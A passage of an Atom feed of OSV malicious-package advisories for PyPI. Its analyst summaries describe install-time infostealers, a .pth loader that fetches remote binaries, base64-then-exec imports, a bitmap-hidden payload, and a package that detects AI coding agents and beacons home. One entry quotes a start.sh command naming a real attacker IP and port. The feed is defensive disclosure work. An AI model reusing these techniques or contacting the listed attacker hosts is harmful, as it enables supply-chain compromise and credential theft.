+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (58d2958d0307dfe5b73dc1eef5a46e96c25f94ea31a0b4ab8b43a1878d427d2d)
+The package advertises itself as &amp;#x27;A push notification package&amp;#x27; but ships an ~8.6 MB opaque ELF x86-64 binary named `claude` and a `start.sh` wrapper as package data (declared in pyproject.toml under [tool.setuptools.package-data]). The pypi entry point `nemopush-run` (nemopush.main:run) invokes `subprocess.run([&amp;quot;bash&amp;quot;, script_path])`, and `start.sh` runs `chmod +x./claude` followed by `./claude --host 45.151.62.119:3361 --user &amp;lt;hardcoded per-install token&amp;gt;`. Running the advertised command executes attacker-controlled native code on the installer&amp;#x27;s host that establishes an outbound connection to a hardcoded bare-IP endpoint, identifying…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/nemopush"&gt;https://bad-packages.kam193.eu/pypi/package/nemopush&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/newbroughblueogwin/automatic-octo-invention"&gt;https://github.com/newbroughblueogwin/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.1/"&gt;https://pypi.org/project/nemopush/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.3/"&gt;https://pypi.org/project/nemopush/0.1.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.2/"&gt;https://pypi.org/project/nemopush/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.0/"&gt;https://pypi.org/project/nemopush/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10866"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10977: Malicious code in lebinfmt (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10977</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10977"/>
+    <published>2026-07-21T08:23:35Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in lebinfmt (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;lebinfmt&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (9eaa5c1d1ed763b9e392bd199c360d75b25531b287de9f224e5626e121d649d4)
+Analysis of lebinfmt 1.0.0 surfaced no behaviors matching supply-chain attack classes. No install-time or import-time network I/O, no credential or filesystem enumeration, no subprocess execution of fetched content, no lifecycle hooks performing sensitive actions, and no hardcoded external destinations were identified across the six files reviewed.
+
+## Source: kam193 (448ec8ad7c978d60f142f12780be3bb6ae7b90870fa4c2bf2d50ca7d4111cdfd)
+This package is prepared to perform steganography decoding using the same code and was published on the same day as package &amp;#x27;rasterkit,&amp;#x27; later used to deliver malicious payload.
+
+
+---
+
+Category: MALICIOUS -…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/lebinfmt"&gt;https://bad-packages.kam193.eu/pypi/package/lebinfmt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/lebinfmt/1.0.0/"&gt;https://pypi.org/project/lebinfmt/1.0.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10977"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-11519: Malicious code in launchdarkly-ai-server-sdk (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11519</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11519"/>
+    <published>2026-08-04T10:10:35Z</published>
+    <updated>2026-08-05T07:21:40Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in launchdarkly-ai-server-sdk (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;launchdarkly-ai-server-sdk&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (460d36c416400537f8c90171c7821b191e0af69df3ec9f0c906300f50b0ea93f)
+launchdarkly-ai-server-sdk 1.0.1 (pypi) was scanned across 7 files with no a static rule matches and no traced behavior of concern. No install-time or import-time network I/O, credential access, subprocess execution, or persistence mechanisms were observed.
+
+## Source: kam193 (7d6642383cc89e975e740067b88a401953adee9187b37a14a33acc833b32d727)
+Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose.
+
+
+---
+
+Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research &amp;amp; c…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/launchdarkly-ai-server-sdk"&gt;https://bad-packages.kam193.eu/pypi/package/launchdarkly-ai-server-sdk&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/launchdarkly-ai-server-sdk/1.0.1/"&gt;https://pypi.org/project/launchdarkly-ai-server-sdk/1.0.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11519"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10917: Malicious code in tinkoff-cloud-apis-internal (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10917</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10917"/>
+    <published>2026-07-18T14:14:02Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in tinkoff-cloud-apis-internal (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;tinkoff-cloud-apis-internal&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (421b85b858849bbf116303f2dc2740180df602dfc162f7ce7fa109e4c39b07ff)
+The package installs a telemetry.pth file into site-packages via a custom install cmdclass; the.pth line imports _telemetry_init, causing every subsequent Python interpreter startup on the host to spawn a background thread that fetches and executes attacker-controlled binaries. The bootstrap resolves platform-specific payload paths (/pkg/package, /pkg/package-arm64, /pkg/loader_mac, /pkg/package.exe) from a rotating set of anonymous Cloudflare Workers mirrors (package-proxy.cf5oobworker.workers.dev, cf8oobworker, cf12oobworker, cf17-ddb, cf25-6eb.workers.dev) with a DNS-over-UDP TXT covert-channel fallback (tin.dl.well1.site, tina.dl.w…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/tinkoff-cloud-apis-internal"&gt;https://bad-packages.kam193.eu/pypi/package/tinkoff-cloud-apis-internal&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection"&gt;https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection"&gt;https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection"&gt;https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection"&gt;https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260720-teqmlshs6y/behavioral1"&gt;https://tria.ge/260720-teqmlshs6y/behavioral1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.4/"&gt;https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.3/"&gt;https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.3/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10917"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10912: Malicious code in shark-e2e-bnsneo (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10912</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10912"/>
+    <published>2026-07-20T10:13:52Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in shark-e2e-bnsneo (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;shark-e2e-bnsneo&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7d634ef25cc07c2f00565518ab2cd2484a0dbf70a5d32d81376f3f7592bd1804)
+On import, __init__.py decodes a base64-encoded string and passes it to exec() inside a _sync_module_docs() helper invoked at module top level. The decoded payload is a Windows-only ctypes call that displays a MessageBox (ctypes.windll.user32.MessageBoxW) and performs no network I/O, no filesystem reads of installer secrets, no credential access, and no persistence. The package metadata describes it as an end-to-end test artifact. The concern is the dispatch pattern itself — opaque base64-then-exec at import time is the obfuscated-code-execution shape and is unsafe regardless of today&amp;#x27;s payload, because the encoded blob is not human-re…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/shark-e2e-bnsneo/0.2.10/"&gt;https://pypi.org/project/shark-e2e-bnsneo/0.2.10/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/shark-e2e-bnsneo/0.2.9/"&gt;https://pypi.org/project/shark-e2e-bnsneo/0.2.9/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/shark-e2e-bnsneo/0.3.1/"&gt;https://pypi.org/project/shark-e2e-bnsneo/0.3.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10912"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10974: Malicious code in rasterkit (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10974</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10974"/>
+    <published>2026-07-21T06:01:48Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in rasterkit (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;rasterkit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (115c87298c4a239bd4954e39a155929c2480510343aefe1fa7c0b631b467af6b)
+The rasterkit 1.0.2 distribution installs its modules under the top-level `PIL/` package name owned by Pillow. `top_level.txt` declares `PIL` and the wheel&amp;#x27;s RECORD places `PIL/__init__.py`, `PIL/Image.py`, `PIL/_binary.py`, and related files under this publisher&amp;#x27;s control, so an environment that installs rasterkit alongside or in place of Pillow will resolve `from PIL import Image` to code shipped by rasterkit. In addition, `PIL/_binary.py` defines a `bmp_plane_tail` function that walks the trailing pixels of a bundled 24-bpp bitmap at `PIL/_data/demo.bmp` (~2.3 MB), reads one byte per pixel, XORs each byte with a caller-supplied key,…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/rasterkit"&gt;https://bad-packages.kam193.eu/pypi/package/rasterkit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/rasterkit/1.0.2/"&gt;https://pypi.org/project/rasterkit/1.0.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/rasterkit/1.0.4/"&gt;https://pypi.org/project/rasterkit/1.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/rasterkit/1.0.0/"&gt;https://pypi.org/project/rasterkit/1.0.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10974"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10907: Malicious code in hello-world-test-mh2 (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10907</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10907"/>
+    <published>2026-07-20T10:13:14Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in hello-world-test-mh2 (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hello-world-test-mh2&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (68a70ea37beb115e4464b5e9ebaf58986f4cd75434257163f4ddb82f5624ea13)
+setup.py decodes a base64 string and passes the result to exec() at install time. The decoded payload is a single print() statement that emits a benign string. A sibling _exfiltrate() function imports socket and urllib.request but the imported modules are never invoked; the function only prints the local platform name. There is no outbound network I/O, no reads of installer secrets or environment variables, no filesystem persistence beyond what pip itself performs, and no follow-on code execution. The package presents itself as a scanner-test artifact and behaves accordingly. The use of exec() on a base64 blob is poor practice (it matc…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/hello-world-test-mh2/0.0.1/"&gt;https://pypi.org/project/hello-world-test-mh2/0.0.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10907"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10908: Malicious code in hello-world-test-mh3 (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10908</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10908"/>
+    <published>2026-07-20T10:13:14Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in hello-world-test-mh3 (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hello-world-test-mh3&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (876b02450317c42447a25bd7f858fab9b44469580c662fbf4cd48ebf7a299edd)
+Package is a trivial hello-world test artifact. setup.py contains an exec(base64.b64decode(...)) call at install time, but the decoded payload is a single print() statement with no network, filesystem, or credential side effects. src/hello_world/__init__.py defines a _remote_update() function whose urlopen+exec branch is guarded by a constant _SIMULATE_ONLY=True, making the network-fetch-and-exec branch statically unreachable; the reachable branch only execs a local print string. No outbound network occurs, no installer secrets are read, and no attacker-controlled code or destination is referenced. The exec+base64 and import-time fetch…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/hello-world-test-mh3/0.0.1/"&gt;https://pypi.org/project/hello-world-test-mh3/0.0.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10908"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10973: Malicious code in fluffy-octo-broccoli (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10973</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10973"/>
+    <published>2026-07-21T05:32:56Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in fluffy-octo-broccoli (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;fluffy-octo-broccoli&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (b017d48fb884ba615e0b62dfd421f8fe24e52695a7ae86c8c158eb2ded44286f)
+fluffy-octo-broccoli ships a 10.7 MB `qiwi.zip` archive whose contents yield no readable filenames or strings via extraction, alongside a `run.sh` that unzips the archive in the current working directory, chmods `start.sh` executable, and runs it. The package&amp;#x27;s console-script entry (`launcher.py`) invokes `bash run.sh` via subprocess. The README&amp;#x27;s only stated purpose is &amp;#x27;Runs the bundled startup script when installed,&amp;#x27; with no description of what the executed shell payload actually does. The archive&amp;#x27;s opacity prevents any inspection of the code that will run when the CLI is invoked. Execution is not automatic on `pip install` — the use…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/newbroughblueogwin/automatic-octo-invention"&gt;https://github.com/newbroughblueogwin/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/fluffy-octo-broccoli"&gt;https://bad-packages.kam193.eu/pypi/package/fluffy-octo-broccoli&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/fluffy-octo-broccoli/0.1.0/"&gt;https://pypi.org/project/fluffy-octo-broccoli/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10973"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-11067: Malicious code in blessclient (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11067</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11067"/>
+    <published>2026-07-25T21:13:35Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in blessclient (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;blessclient&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (82efbe82f1f4cdc513a33b4deeb7a811318155aaf4de1d4319dc54f8730f409b)
+The package name matches Lyft&amp;#x27;s internal `python-blessclient` and is published on the public index as a dependency-confusion tripwire. `setup.py` overrides the `install` command class (`InstallWithCanary`) to issue an HTTP GET to `http://canarytokens.com/about/static/obeoafaz522zscu7248tqu4rh/submit.aspx` during `pip install`, and `blessclient/__init__.py` fires the same beacon at import time via `urllib.request.urlopen(_CANARY_URL)`. The beacon body carries only what an ordinary HTTP GET reveals (source IP, User-Agent); no environment variables, filesystem contents, or credentials are read or transmitted, and no code is fetched or exe…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/blessclient"&gt;https://bad-packages.kam193.eu/pypi/package/blessclient&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/blessclient/0.0.1/"&gt;https://pypi.org/project/blessclient/0.0.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/blessclient/0.0.2/"&gt;https://pypi.org/project/blessclient/0.0.2/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11067"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-10760: Malicious code in abseil-py (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-10760</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10760"/>
+    <published>2026-07-16T20:50:52Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in abseil-py (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;abseil-py&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7087d90aa66c4de3fd4d92cd4f25088ea3ef20c78223a787768779ef5e1f0ac6)
+Distribution name `abseil-py` name-squats Google&amp;#x27;s widely-used `absl-py` (Abseil Python common libraries); the import name `abseil_py` also differs from the legitimate `absl` module. During `bdist_wheel`, setup.py walks the parent-process chain via psutil and matches process names against a hardcoded list of AI coding agent markers (claude-code, codex, cursor, gemini, grok, copilot, aider, opencode, qwen, amazon-q). On a match, `_report()` POSTs a JSON payload containing the package name, event, matched agent label, and timestamp to the hardcoded endpoint `https://vero-research.com/` using `urllib.request.urlopen` with a spoofed browse…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/abseil-py"&gt;https://bad-packages.kam193.eu/pypi/package/abseil-py&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/abseil-py/0.1.0/"&gt;https://pypi.org/project/abseil-py/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10760"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-12083: Malicious code in crypto-wallet-sdk (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-12083</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-12083"/>
+    <published>2026-08-05T05:05:40Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in crypto-wallet-sdk (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;crypto-wallet-sdk&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: kam193 (d0bf047680c46c2f4c37c8a7b77e9d993acb05ef4925c660e0c5cccf95be581f)
+During installation, the package exfiltrates sensitive env variables, browser data, crypto wallets files, ssh keys and other configuration files.
+
+
+---
+
+Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.
+
+
+Campaign: 2026-08-bip39-py
+
+
+Reasons (based on the campaign):
+
+
+ - crypto-related
+
+
+ - The package overrides the install command in setup.py to execute malicious code during installation.
+
+
+ - exfiltration-crypto
+
+
+ - exfiltration-browser-data
+
+
+ - exfiltration-env-variables
+
+
+ - exfiltration-ssh-keys
+
+
+ - exfiltration-credentials
+
+
+ - uses-telegram-bot
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/crypto-wallet-sdk"&gt;https://bad-packages.kam193.eu/pypi/package/crypto-wallet-sdk&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-12083"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-12082: Malicious code in crypto-trading-toolkit (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-12082</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-12082"/>
+    <published>2026-08-05T05:05:04Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in crypto-trading-toolkit (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;crypto-trading-toolkit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: kam193 (20c37efbefbfb1922a205d954cdb5666103fd3e343a67e89dc19694ad5b64ef0)
+During installation, the package exfiltrates sensitive env variables, browser data, crypto wallets files, ssh keys and other configuration files.
+
+
+---
+
+Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.
+
+
+Campaign: 2026-08-bip39-py
+
+
+Reasons (based on the campaign):
+
+
+ - crypto-related
+
+
+ - The package overrides the install command in setup.py to execute malicious code during installation.
+
+
+ - exfiltration-crypto
+
+
+ - exfiltration-browser-data
+
+
+ - exfiltration-env-variables
+
+
+ - exfiltration-ssh-keys
+
+
+ - exfiltration-credentials
+
+
+ - uses-telegram-bot
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/crypto-trading-toolkit"&gt;https://bad-packages.kam193.eu/pypi/package/crypto-trading-toolkit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-12082"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-11417: Malicious code in aiprepkit (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-11417</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11417"/>
+    <published>2026-07-31T14:54:17Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in aiprepkit (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;aiprepkit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (9b253f849a7c5b8df780b282a05d2928e8b6003f51564e6997ad881391b8ec58)
